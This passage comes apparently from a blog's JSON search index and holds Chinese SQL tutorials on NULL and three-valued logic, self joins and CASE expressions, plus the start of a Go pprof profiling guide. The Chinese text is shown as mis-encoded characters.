UNKNOWN(æœªçŸ¥)æ˜¯ä¸åŒçš„ä¸œè¥¿ã€‚ï¼ˆå‰è€…æ˜¯æ˜ç¡®çš„å¸ƒå°”å‹çš„çœŸå€¼ï¼Œåè€…æ—¢ä¸æ˜¯å€¼ä¹Ÿä¸ æ˜¯å˜é‡ï¼‰ã€‚\n\nx æ˜¯çœŸå€¼ **unknown** æ—¶ï¼Œx=x è¢«åˆ¤æ–­ä¸º **true**ï¼Œè€Œ x æ˜¯ UNKNOWN æ—¶è¢«åˆ¤æ–­ä¸º **unknown**ã€‚\n\n```sql\n-- è¿™ä¸ªæ˜¯æ˜ç¡®çš„çœŸå€¼çš„æ¯”è¾ƒ \nunknown = unknown \t\t\t\tâ†’ true\n\n\n-- è¿™ä¸ªç›¸å½“äºNULL = NULL \nUNKNOWN = UNKNOWN \t\t\t\tâ†’ unknown\n```\n\n\n\n+ SQL éµå¾ªçš„ä¸‰å€¼é€»è¾‘çš„çœŸå€¼è¡¨\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B03-%E4%B8%89%E5%80%BC%E9%80%BB%E8%BE%91%E5%92%8CNULL/image-20220318163228105.png\" alt=\"image-20220318163228105\" style=\"zoom: 50%;\" />\n\nå›¾ä¸­æµ…è“è‰²éƒ¨åˆ†æ˜¯ä¸‰å€¼é€»è¾‘ä¸­ç‹¬æœ‰çš„è¿ç®—ï¼Œè¿™åœ¨äºŒå€¼é€»è¾‘ä¸­æ˜¯æ²¡æœ‰çš„ã€‚ å…¶ä½™çš„ SQL è°“è¯å…¨éƒ¨éƒ½èƒ½ç”±è¿™ä¸‰ä¸ªé€»è¾‘è¿ç®—ç»„åˆè€Œæ¥ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè®²ï¼Œ è¿™ä¸ªçŸ©é˜µå¯ä»¥è¯´æ˜¯ SQL çš„æ¯ä½“(matrix)ã€‚\n\nä¸ºäº†ä¾¿äºè®°å¿†ï¼Œè¯·æ³¨ æ„è¿™ä¸‰ä¸ªçœŸå€¼ä¹‹é—´æœ‰ä¸‹é¢è¿™æ ·çš„ä¼˜å…ˆçº§é¡ºåºã€‚\n\n+ **AND** çš„æƒ…å†µ: **false** > **unknown** > **true** \n+ **OR** çš„æƒ…å†µ: **true** > **unknown** > **false**\n\n\n\nä¼˜å…ˆçº§é«˜çš„çœŸå€¼ä¼šå†³å®šè®¡ç®—ç»“æœã€‚ä¾‹å¦‚**true** AND **unknown**ï¼Œå› ä¸º **unknown**çš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œæ‰€ä»¥ç»“æœæ˜¯**unknown**ã€‚è€Œ**true** OR **unknown**çš„è¯ï¼Œå› ä¸º **true** ä¼˜å…ˆçº§æ›´é«˜ï¼Œæ‰€ä»¥ç»“æœæ˜¯ **true**ã€‚\n\n\n\n### 1.4 æ¯”è¾ƒè°“è¯å’Œ NULL\n\n+ çº¦ç¿°æ˜¯ 20 å²ï¼Œæˆ–è€…ä¸æ˜¯ 20 å²ï¼ŒäºŒè€…å¿…å±…å…¶ä¸€ã€‚\n\nâ€œæŠŠå‘½é¢˜å’Œå®ƒçš„å¦å‘½é¢˜é€š è¿‡â€˜æˆ–è€…â€™è¿æ¥è€Œæˆçš„å‘½é¢˜å…¨éƒ½æ˜¯çœŸå‘½é¢˜â€è¿™ä¸ªå‘½é¢˜åœ¨äºŒå€¼é€»è¾‘ä¸­è¢«ç§°ä¸º æ’ä¸­å¾‹(Law of Excluded Middle)ã€‚\n\n```sql\n-- æŸ¥è¯¢å¹´é¾„æ˜¯ 20 å²æˆ–è€…ä¸æ˜¯ 20 å²çš„å­¦ç”Ÿ \n\nSELECT * FROM Students WHERE age = 20 OR age <> 20;\n```\n\né—æ†¾çš„æ˜¯ï¼Œåœ¨ SQL çš„ä¸–ç•Œé‡Œï¼Œæ’ä¸­å¾‹æ˜¯ä¸æˆç«‹çš„ã€‚å¦‚æœæœ‰ä¸€æ¡å­˜åœ¨NULLã€‚\n\n```sql\n-- æ·»åŠ ç¬¬ 3 ä¸ªæ¡ä»¶ :å¹´é¾„æ˜¯ 20 å²ï¼Œæˆ–è€…ä¸æ˜¯ 20 å²ï¼Œæˆ–è€…å¹´é¾„æœªçŸ¥ \n\nSELECT * FROM Students WHERE age = 20 OR age <> 20 OR age IS NULL;\n```\n\n\n\n+ CASE WHENæ—¶ä¹Ÿè¦æ³¨æ„\n\n```sql\n-- col_1 ä¸º 1 æ—¶è¿”å›â—‹ã€ä¸º NULL æ—¶è¿”å› Ã— çš„ CASE è¡¨è¾¾å¼? \n\nCASE col_1 WHEN 1 THEN 'â—‹'\nWHEN NULL THEN 'Ã—' END\n\n-- ä¿®æ”¹æˆä¸‹é¢çš„\n\nCASE WHEN col_1 = 1 THEN 'â—‹' \nWHEN col_1 IS NULL THEN 'Ã—' END\n```\n\n\n\n+ NOT IN å’Œ NOT EXISTS\n\n```sql\n-- è¿™æ¡ SQL è¯­å¥çœŸçš„èƒ½æ­£ç¡®åœ°æŸ¥è¯¢åˆ°NULL age çš„å­¦ç”Ÿå—?é—æ†¾çš„æ˜¯ä¸èƒ½ã€‚ ç»“æœæ˜¯ç©ºï¼ŒæŸ¥è¯¢ä¸åˆ°ä»»ä½•æ•°æ®ã€‚\n\nSELECT * FROM Class_A\nWHERE age NOT IN ( SELECT age\nFROM Class_B\nWHERE city = 'ä¸œäº¬' );\n\n\n\n-- æ­£ç¡®çš„ SQL è¯­å¥: NULL ageå°†è¢«æŸ¥è¯¢åˆ°\nSELECT *\nFROM Class_A A\nWHERE NOT EXISTS ( SELECT * FROM Class_B B WHERE A.age = B.age AND B.city = 'ä¸œäº¬' );\n```\n\näº§ç”Ÿè¿™æ ·çš„ç»“æœï¼Œæ˜¯å› ä¸º EXISTS è°“è¯æ°¸ è¿œä¸ä¼šè¿”å› **unknown**ã€‚EXISTS åªä¼šè¿”å› **true** æˆ–è€… **false**ã€‚å› æ­¤å°±æœ‰äº† IN å’Œ EXISTS å¯ä»¥äº’ç›¸æ›¿æ¢ä½¿ç”¨ï¼Œè€Œ NOT IN å’Œ NOT EXISTS å´ä¸å¯ä»¥äº’ ç›¸æ›¿æ¢çš„æ··ä¹±ç°è±¡ã€‚è™½ç„¶å†™ä»£ç çš„æ—¶å€™å¾ˆéš¾åšåˆ°ç»å¯¹ä¸ä¾èµ–ç›´è§‰ï¼Œä½†ä½œä¸º æ•°æ®åº“å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œè¿˜æ˜¯éœ€è¦å¥½å¥½ç†è§£ä¸€ä¸‹è¿™ç§ç°è±¡ã€‚\n\n\n\n### 1.5 é™å®šè°“è¯å’Œæå€¼å‡½æ•°å¯¹å¾…NULLéç­‰ä»·\n\n+ é™å®šè°“è¯\n\n```sql\n -- æŸ¥è¯¢æ¯” B ç­ä½åœ¨ä¸œäº¬çš„æ‰€æœ‰å­¦ç”Ÿå¹´é¾„éƒ½å°çš„ A ç­å­¦ç”Ÿ\nSELECT *\nFROM Class_A\nWHERE age < ALL ( SELECT age FROM Class_B\nWHERE city = 'ä¸œäº¬' );\n```\n\n\n\n+ æå€¼å‡½æ•°\n\n```sql\n-- æŸ¥è¯¢æ¯” B ç­ä½åœ¨ä¸œäº¬çš„å¹´é¾„æœ€å°çš„å­¦ç”Ÿè¿˜è¦å°çš„ A ç­å­¦ç”Ÿ \nSELECT *\nFROM Class_A\nWHERE age < ( SELECT MIN(age) FROM Class_B\nWHERE city = 'ä¸œäº¬' );\n```\n\n\n\n+ æ€»ç»“\n\næå€¼å‡½æ•°åœ¨ç»Ÿè®¡æ—¶ä¼šæŠŠä¸º NULL çš„æ•°æ®æ’é™¤æ‰ã€‚\n\n1. ALLè°“è¯:ä»–çš„å¹´é¾„æ¯”åœ¨ä¸œäº¬ä½çš„æ‰€æœ‰å­¦ç”Ÿéƒ½å° \n2. æå€¼å‡½æ•°:ä»–çš„å¹´é¾„æ¯”åœ¨ä¸œäº¬ä½çš„å¹´é¾„æœ€å°çš„å­¦ç”Ÿè¿˜è¦å°\n\nåœ¨ç°å®ä¸–ç•Œä¸­ï¼Œè¿™ä¸¤ä¸ªå‘½é¢˜æ˜¯ä¸€ä¸ªæ„æ€ã€‚ä½†æ˜¯ï¼Œæ­£å¦‚æˆ‘ä»¬é€šè¿‡å‰é¢çš„ ä¾‹é¢˜çœ‹åˆ°çš„é‚£æ ·ï¼Œè¡¨é‡Œå­˜åœ¨ NULL æ—¶å®ƒä»¬æ˜¯ä¸ç­‰ä»·çš„ã€‚\n\n\n\n### 1.6 èšåˆå‡½æ•°å’Œ NULL\n\nCOUNT ä»¥å¤– çš„èšåˆå‡½æ•°ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n\n```sql\n-- æŸ¥è¯¢æ¯”ä½åœ¨ä¸œäº¬çš„å­¦ç”Ÿçš„å¹³å‡å¹´é¾„è¿˜è¦å°çš„ A ç­å­¦ç”Ÿçš„ SQL è¯­å¥? \nSELECT * FROM Class_A\nWHERE age < ( SELECT AVG(age)\nFROM Class_B\nWHERE city = 'ä¸œäº¬' )\n```\n\næ²¡æœ‰ä½åœ¨ä¸œäº¬çš„å­¦ç”Ÿæ—¶ï¼ŒAVG å‡½æ•°è¿”å› NULLã€‚å› æ­¤ï¼Œå¤–ä¾§çš„ WHERE å­å¥æ°¸è¿œæ˜¯ **unknown**ï¼Œä¹Ÿå°±æŸ¥è¯¢ä¸åˆ°è¡Œã€‚\n\n**èšåˆå‡½æ•°å’Œæå€¼å‡½æ•°çš„è¿™ä¸ªé™·é˜±æ˜¯ç”±å‡½æ•°è‡ªèº«å¸¦æ¥çš„**ï¼Œæ‰€ä»¥ä»…é ä¸ºå…·ä½“åˆ—åŠ ä¸Š NOT NULL çº¦æŸæ˜¯æ— æ³•ä»æ ¹æœ¬ä¸Šæ¶ˆé™¤çš„ã€‚å› æ­¤æˆ‘ä»¬åœ¨ç¼–å†™ SQL ä»£ç çš„æ—¶å€™éœ€è¦ç‰¹åˆ«æ³¨æ„ã€‚\n\n\n\n### 1.7 æ€»ç»“\n\n+ NULL ä¸æ˜¯å€¼ã€‚\n+ å› ä¸º NULL ä¸æ˜¯å€¼ï¼Œæ‰€ä»¥ä¸èƒ½å¯¹å…¶ä½¿ç”¨è°“è¯ã€‚\n+ å¯¹ NULL ä½¿ç”¨è°“è¯åçš„ç»“æœæ˜¯ **unknown**ã€‚\n+ **unknown** å‚ä¸åˆ°é€»è¾‘è¿ç®—æ—¶ï¼ŒSQL çš„è¿è¡Œä¼šå’Œé¢„æƒ³çš„ä¸ä¸€æ ·ã€‚\n\n+ è¦æƒ³è§£å†³ NULL å¸¦æ¥çš„å„ç§é—®é¢˜ï¼Œæœ€ä½³æ–¹æ³•åº”è¯¥æ˜¯å¾€ è¡¨é‡Œæ·»åŠ NOT NULLçº¦æŸæ¥å°½åŠ›æ’é™¤NULLã€‚è¿™æ ·å°±å¯ä»¥å›åˆ°ç¾å¦™çš„äºŒå€¼é€» è¾‘ä¸–ç•Œ(è™½ç„¶å¹¶ä¸èƒ½å®Œå…¨å›åˆ°)ã€‚\n\n\n\n\n\n\n\n\n\n\n\n","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"sqlè¿›é˜¶æ•™ç¨‹02-è‡ªè¿æ¥","url":"%2Fp%2F93c1444.html","content":"\næ— è®ºè¡¨è¿˜æ˜¯è§†å›¾ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯é›†åˆã€‚é›†åˆæ˜¯ SQL èƒ½å¤„ç†çš„å”¯ä¸€çš„æ•°æ®ç»“æ„ã€‚\n\n<!-- more -->\n\n### 1.1 è‡ªè¿æ¥ä½¿ç”¨\n\nè‡ªè¿æ¥å’Œéç­‰å€¼è¿æ¥ç»“åˆèµ·æ¥éå¸¸å¥½ç”¨ã€‚\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314165606924.png\" alt=\"image-20220314165606924\" style=\"zoom: 50%;\" />\n\n```sql\n-- ç”¨äºè·å–æ’åˆ—çš„ SQL è¯­å¥\nSELECT P1.name AS name_1, P2.name AS name_2\nFROM Products P1, Products P2 WHERE P1.name <> P2.name;\n```\n\næ— è®ºæ˜¯ P1 è¿˜æ˜¯ P2ï¼Œå®é™…ä¸Šæ•°æ®éƒ½æ¥è‡ªåŒä¸€å¼ ç‰©ç†è¡¨ Productã€‚ä½†æ˜¯ï¼Œåœ¨ SQL é‡Œï¼Œåªè¦è¢«èµ‹äºˆäº†ä¸åŒçš„åç§°ï¼Œå³ä¾¿æ˜¯ç›¸åŒçš„è¡¨ä¹Ÿ åº”è¯¥å½“ä½œä¸åŒçš„è¡¨(é›†åˆ)æ¥å¯¹å¾…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒP1 å’Œ P2 å¯ä»¥çœ‹æˆæ˜¯ç¢°å·§ å­˜å‚¨äº†ç›¸åŒæ•°æ®çš„ä¸¤ä¸ªé›†åˆã€‚\n\n\n\n### 1.2 æŸ¥æ‰¾å±€éƒ¨ä¸ä¸€è‡´çš„åˆ—\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314162817302.png\" alt=\"image-20220314162817302\" style=\"zoom: 50%;\" />\n\n```sql\nSELECT DISTINCT P1.name,P1.price FROM Products P1, Products P2 WHERE P1.name <> P2.name AND P1.price = P2.price;\n\n/*\nè‰è“\t100\nè‘¡è„\t50\né¦™è•‰\t50\næ©˜å­\t100\nè‹¹æœ\t50\n*/\n```\n\n\n\n### 1.3 æ’åº\n\næ’åºä» 1 å¼€å§‹ã€‚å¦‚æœå·²å‡ºç°ç›¸åŒä½æ¬¡ï¼Œåˆ™è·³è¿‡ä¹‹åçš„ä½æ¬¡ã€‚\n\n```sql\nSELECT name, price, (SELECT COUNT(P2.price) FROM Products P2 WHERE P2.price > P1.price) +1 AS rank\nFROM Products P1 order by rank\n\n/*\nè‰è“\t100\t1\næ©˜å­\t100\t1\nè¥¿ç“œ\t80\t3\nè‘¡è„\t50\t4\nè‹¹æœ\t50\t4\né¦™è•‰\t50\t4\næŸ æª¬\t30\t7\n*/\n```\n\nè¿™é“ä¾‹é¢˜å¾ˆå¥½ åœ°ä½“ç°äº†é¢å‘é›†åˆçš„æ€ç»´æ–¹å¼ã€‚å­æŸ¥è¯¢æ‰€åšçš„ï¼Œæ˜¯è®¡ç®—å‡ºä»·æ ¼æ¯”è‡ªå·±é«˜çš„ è®°å½•çš„æ¡æ•°å¹¶å°†å…¶ä½œä¸ºè‡ªå·±çš„ä½æ¬¡ã€‚\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314171123022.png\" alt=\"image-20220314171123022\" style=\"zoom: 50%;\" />\n\n### 1.4 é›†åˆåŒ…å«å…³ç³»\n\n```sql\n/*\næŸ æª¬\t30\nè‘¡è„\t50\nè¥¿ç“œ\t80\næ©˜å­\t100\n*/\n\n\n\n\nSELECT P1.name,\n       MAX(P1.price) AS price,\n       COUNT(P2.name) +1 AS rank_1\n  FROM Products P1 LEFT JOIN Products P2\n    ON P1.price < P2.price\n GROUP BY P1.name\n ORDER BY rank_1;\n\n/*\næ©˜å­\t100\t1\nè¥¿ç“œ\t80\t2\nè‘¡è„\t50\t3\næŸ æª¬\t30\t4\n */\n```\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314172551051.png\" alt=\"image-20220314172551051\" style=\"zoom: 33%;\" />\n\n\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314172928558.png\" alt=\"image-20220314172928558\" style=\"zoom: 33%;\" />\n\n### 1.5 æ€»ç»“\n\nä¸å¤šè¡¨ä¹‹é—´è¿›è¡Œçš„æ™®é€šè¿æ¥ç›¸æ¯”ï¼Œè‡ªè¿æ¥çš„æ€§èƒ½å¼€é”€æ›´å¤§(ç‰¹åˆ«æ˜¯ä¸éç­‰å€¼è¿æ¥ç»“åˆä½¿ç”¨çš„æ—¶å€™)ï¼Œå› æ­¤ç”¨äºè‡ªè¿æ¥çš„åˆ—æ¨èä½¿ç”¨ä¸»é”® æˆ–è€…åœ¨ç›¸å…³åˆ—ä¸Šå»ºç«‹ç´¢å¼•ã€‚\n\n+ è‡ªè¿æ¥ç»å¸¸å’Œéç­‰å€¼è¿æ¥ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚ \n+ è‡ªè¿æ¥å’ŒGROUP BYç»“åˆä½¿ç”¨å¯ä»¥ç”Ÿæˆé€’å½’é›†åˆã€‚\n+ å°†è‡ªè¿æ¥çœ‹ä½œä¸åŒè¡¨ä¹‹é—´çš„è¿æ¥æ›´å®¹æ˜“ç†è§£ã€‚\n+ åº”æŠŠè¡¨çœ‹ä½œè¡Œçš„é›†åˆï¼Œç”¨é¢å‘é›†åˆçš„æ–¹æ³•æ¥æ€è€ƒã€‚\n+  è‡ªè¿æ¥çš„æ€§èƒ½å¼€é”€æ›´å¤§ï¼Œåº”å°½é‡ç»™ç”¨äºè¿æ¥çš„åˆ—å»ºç«‹ç´¢å¼•ã€‚","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"sqlè¿›é˜¶æ•™ç¨‹01-caseè¡¨è¾¾å¼","url":"%2Fp%2F4229a5b2.html","content":"\næ–°æ‰‹ç”¨ **WHERE** å­å¥å’Œ **HAVING** å­å¥è¿›è¡Œæ¡ä»¶åˆ†æ”¯ï¼Œé«˜æ‰‹ç”¨ **SELECT** å­å¥è¿›è¡Œæ¡ä»¶ åˆ†æ”¯ã€‚\n\n<!-- more -->\n\n### 1.1 åŸºç¡€ä½¿ç”¨\n\nCASE è¡¨è¾¾å¼æ˜¯ä¸ä¾èµ–äºå…·ä½“ æ•°æ®åº“çš„æŠ€æœ¯ï¼Œæ‰€ä»¥å¯ä»¥æé«˜ SQL ä»£ç çš„å¯ç§»æ¤æ€§ã€‚\n\n```sql\nCREATE TABLE `users` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `sex` tinyint(4) NOT NULL DEFAULT '1' COMMENT '1 ç”· 2å¥³',\n  `name` varchar(255) NOT NULL DEFAULT '0',\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4;\n\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (1, 2, 'levon');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (2, 1, 'fly');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (3, 1, 'xuan');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (4, 1, 'yuan');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (5, 2, 'haha');\n\nSELECT name,(CASE WHEN sex = 1 THEN 'ç”·' WHEN sex = 2 THEN 'å¥³' ELSE 'å…¶ä»–' END)sex FROM users\n/*\nlevon\tå¥³\nfly\tç”·\nxuan\tç”·\nyuan\tç”·\nhaha\tå¥³\n*/\n```\n\nå¦‚æœ CASE è¡¨è¾¾å¼é‡Œæ²¡æœ‰æ˜ç¡®æŒ‡å®š ELSE å­å¥ï¼Œ æ‰§è¡Œç»“æœä¼šè¢«é»˜è®¤åœ°å¤„ç†æˆELSE NULLã€‚æ‰€ä»¥ä¸€å®šè¦å†™ELSEã€‚\n\n\n\n### 1.2 select ä¸åŒæ¡ä»¶\n\n<img src=\"sqlè¿›é˜¶æ•™ç¨‹01-caseè¡¨è¾¾å¼/1.png\" alt=\"image-20220311181835776\" style=\"zoom:33%;\" />\n\n\n\n```sql\n/* ç”¨ä¸€æ¡SQLè¯­å¥è¿›è¡Œä¸åŒæ¡ä»¶çš„ç»Ÿè®¡ */\nSELECT pref_name,\n       /* ç”·æ€§äººå£ */\n       SUM( CASE WHEN sex = '1' THEN population ELSE 0 END) AS cnt_m,\n       /* å¥³æ€§äººå£ */\n       SUM( CASE WHEN sex = '2' THEN population ELSE 0 END) AS cnt_f\n  FROM PopTbl2\n GROUP BY pref_name;\n \n \n /*\nä¸œäº¬\t250\t150\nä½è´º\t20\t80\nå¾·å²›\t60\t40\nçˆ±åª›\t100\t50\nç¦å†ˆ\t100\t200\né•¿å´\t125\t125\né¦™å·\t100\t100\né«˜çŸ¥\t100\t100\n */\n```\n\n\n\nè¿™ä¸ªæŠ€å·§å¯è´µçš„åœ°æ–¹åœ¨äºï¼Œå®ƒèƒ½å°† SQL çš„æŸ¥è¯¢ç»“æœè½¬æ¢ä¸ºäºŒç»´è¡¨çš„æ ¼å¼ã€‚\n\nå¦‚æœåªæ˜¯ç®€å•åœ°ç”¨ GROUP BY è¿›è¡Œèšåˆï¼Œé‚£ä¹ˆæŸ¥è¯¢åå¿…é¡»é€šè¿‡ç¨‹åºå°†ç»“æœçš„æ ¼å¼è½¬æ¢ä¸€ä¸‹ï¼Œæ‰èƒ½ä½¿ä¹‹æˆä¸ºäº¤å‰è¡¨ã€‚\n\n\n\n### 1.3 update è°ƒæ¢å€¼\n\n```sql\n/* ç”¨CASEè¡¨è¾¾å¼è°ƒæ¢ä¸»é”®å€¼ */\nUPDATE SomeTable\n   SET p_key = CASE WHEN p_key = 'a'\n                    THEN 'b'\n                    WHEN p_key = 'b'\n                    THEN 'a'\n                    ELSE p_key END\n WHERE p_key IN ('a', 'b');\n```\n\n\n\n### 1.4 å¼ºå¤§è¡¨è¾¾èƒ½åŠ›\n\nåœ¨ CASE è¡¨è¾¾å¼é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ BETWEENã€LIKE å’Œ <ã€ > ç­‰ ä¾¿åˆ©çš„è°“è¯ç»„åˆï¼Œä»¥åŠèƒ½åµŒå¥—å­æŸ¥è¯¢çš„ IN å’Œ EXISTS è°“è¯ã€‚å› æ­¤ï¼ŒCASE è¡¨è¾¾å¼å…·æœ‰éå¸¸å¼ºå¤§çš„è¡¨è¾¾èƒ½åŠ›ã€‚\n\n\n\nä½œä¸ºè¡¨è¾¾å¼ï¼ŒCASE è¡¨è¾¾å¼åœ¨æ‰§è¡Œæ—¶ä¼šè¢«åˆ¤å®šä¸ºä¸€ä¸ªå›ºå®šå€¼ï¼Œå› æ­¤å®ƒ å¯ä»¥å†™åœ¨èšåˆå‡½æ•°å†…éƒ¨;ä¹Ÿæ­£å› ä¸ºå®ƒæ˜¯è¡¨è¾¾å¼ï¼Œæ‰€ä»¥è¿˜å¯ä»¥å†™åœ¨ SELECE å­å¥ã€GROUP BY å­å¥ã€WHERE å­å¥ã€ORDER BY å­å¥é‡Œã€‚ç®€å•ç‚¹è¯´ï¼Œåœ¨èƒ½ å†™åˆ—åå’Œå¸¸é‡çš„åœ°æ–¹ï¼Œé€šå¸¸éƒ½å¯ä»¥å†™ CASE è¡¨è¾¾å¼ã€‚\n\n\n\n### 1.5 ç»ƒä¹ \n\n+ ä»å¤šåˆ—æ•°æ®é‡Œé€‰å‡ºæœ€å¤§å€¼è¯¥æ€ä¹ˆåšå‘¢\n\n<img src=\"sqlè¿›é˜¶æ•™ç¨‹01-caseè¡¨è¾¾å¼/2.png\" alt=\"image-20220314120315683\" style=\"zoom:50%;\" />\n\n  ```sql\n SELECT `key`, CASE WHEN x > y THEN x ELSE (CASE WHEN y > z THEN y ELSE z END) END greatest FROM Greatests\n\n  /*\n  A\t3\n  B\t5\n  C\t7\n  D\t8\n  */\n  ```\n\n\n\n\n+ ç”¨ ORDER BY ç”Ÿæˆâ€œæ’åºâ€åˆ—, ä½¿å¾—ç»“æœæŒ‰ç…§ B-A-D-C è¿™æ ·çš„æŒ‡å®šé¡º åºè¿›è¡Œæ’åˆ—ã€‚\n\n  ```sql\n  SELECT `key` FROM Greatests ORDER BY CASE `key`\n              WHEN 'B' THEN 1\n              WHEN 'A' THEN 2\n              WHEN 'D' THEN 3\n              WHEN 'C' THEN 4\n              ELSE NULL END;\n  ```\n\n  \n\n+ è½¬æ¢è¡Œåˆ— (1.2)\n\n  ```sql\n   SELECT CASE WHEN sex = 1 THEN 'ç”·' ELSE 'å¥³' END æ€§åˆ«,\n         SUM(population) AS total,\n         SUM(CASE WHEN pref_name = 'å¾·å²›' THEN population ELSE 0 END) AS å¾·å²›,\n         SUM(CASE WHEN pref_name = 'é¦™å·' THEN population ELSE 0 END) AS é¦™å·,\n         SUM(CASE WHEN pref_name = 'çˆ±åª›' THEN population ELSE 0 END) AS çˆ±åª›,\n         SUM(CASE WHEN pref_name = 'é«˜çŸ¥' THEN population ELSE 0 END) AS é«˜çŸ¥,\n         SUM(CASE WHEN pref_name IN ('å¾·å²›', 'é¦™å·', 'çˆ±åª›', 'é«˜çŸ¥') THEN population ELSE 0 END) AS å››å›½\n    FROM PopTbl2\n   GROUP BY sex;\n   \n   /*\n  ç”·\t855\t60\t100\t100\t100\t360\n  å¥³\t845\t40\t100\t50\t100\t290\n   */\n  ```\n\n  \n\n### 1.6  æ€»ç»“\n\n\n1. åœ¨ GROUP BY å­å¥é‡Œä½¿ç”¨ CASE è¡¨è¾¾å¼ï¼Œå¯ä»¥çµæ´»åœ°é€‰æ‹©ä½œä¸ºèšåˆ çš„å•ä½çš„ç¼–å·æˆ–ç­‰çº§ã€‚è¿™ä¸€ç‚¹åœ¨è¿›è¡Œéå®šåˆ¶åŒ–ç»Ÿè®¡æ—¶èƒ½å‘æŒ¥å·¨å¤§çš„å¨åŠ›ã€‚ 2. åœ¨èšåˆå‡½æ•°ä¸­ä½¿ç”¨ CASE è¡¨è¾¾å¼ï¼Œå¯ä»¥è½»æ¾åœ°å°†è¡Œç»“æ„çš„æ•°æ®è½¬æ¢\næˆåˆ—ç»“æ„çš„æ•°æ®ã€‚\n3. ç›¸åï¼Œèšåˆå‡½æ•°ä¹Ÿå¯ä»¥åµŒå¥—è¿› CASE è¡¨è¾¾å¼é‡Œä½¿ç”¨ã€‚\n4. ç›¸æ¯”ä¾èµ–äºå…·ä½“æ•°æ®åº“çš„å‡½æ•°ï¼ŒCASE è¡¨è¾¾å¼æœ‰æ›´å¼ºå¤§çš„è¡¨è¾¾èƒ½åŠ›\nå’Œæ›´å¥½çš„å¯ç§»æ¤æ€§ã€‚\n5. æ­£å› ä¸º CASE è¡¨è¾¾å¼æ˜¯ä¸€ç§è¡¨è¾¾å¼è€Œä¸æ˜¯è¯­å¥ï¼Œæ‰æœ‰äº†è¿™è¯¸å¤šä¼˜ç‚¹ã€‚","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"pprofæ’æŸ¥golangé—®é¢˜","url":"%2Fp%2F771638a0.html","content":"\n# 1. quick start\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t_ \"net/http/pprof\"\n)\n\nfunc main() {\n\tlog.Println(http.ListenAndServe(\"localhost:6060\", nil))\n}\n\n```\n\n<!-- more -->\n\næ‰“å¼€æµè§ˆå™¨, è¾“å…¥ `http://localhost:6060/debug/pprof/`, å†…å®¹æ˜¾ç¤ºå¦‚ä¸‹:\n\n```bash\n/debug/pprof/\n\nTypes of profiles available:\nCount\tProfile\n1\tallocs # å†…å­˜åˆ†é…æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tblock\t # é˜»å¡æ“ä½œæƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tcmdline #\tæ˜¾ç¤ºç¨‹åºå¯åŠ¨å‘½ä»¤åŠå‚æ•°\n4\tgoroutine # å½“å‰æ‰€æœ‰åç¨‹çš„å †æ ˆä¿¡æ¯\n1\theap # å †ä¸Šå†…å­˜ä½¿ç”¨æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tmutex # é”äº‰ç”¨æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tprofile # CPU å ç”¨æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n5\tthreadcreate # ç³»ç»Ÿçº¿ç¨‹åˆ›å»ºæƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\ttrace # ç¨‹åºè¿è¡Œè·Ÿè¸ªä¿¡æ¯\nfull goroutine stack dump\n```\n\nä¸Šé¢æ¯ä¸€ä¸ªéƒ½æ˜¯ä¸€ä¸ªè¶…é“¾æ¥, å¯ä»¥ç‚¹è¿›å», çœ‹åˆ°å †æ ˆä¿¡æ¯\n\n\n\n# 2. å‘½ä»¤æŸ¥çœ‹\n\n+ macéœ€è¦å®‰è£…graphviz\n\n    ```bash\n    brew install graphviz\n    # å¦‚æœä¸€ç›´ä¸‹è½½ä¸æˆåŠŸ, ä¿®æ”¹brewæº\n    ```\n    \n+ æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ\n\n  ```bash\n  go tool pprof http://localhost:6060/debug/pprof/heap\n  # è¿›å…¥å¦‚ä¸‹gdbäº¤äº’æ¨¡å¼:\n  \n  # top æŸ¥çœ‹å‰10ä¸ªçš„å†…å­˜åˆ†é…æƒ…å†µ\n  (pprof) top\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n        flat  flat%   sum%        cum   cum%\n      1.16MB   100%   100%     1.16MB   100%  runtime/pprof.writeGoroutineStacks\n           0     0%   100%     1.16MB   100%  net/http.(*ServeMux).ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.(*conn).serve\n           0     0%   100%     1.16MB   100%  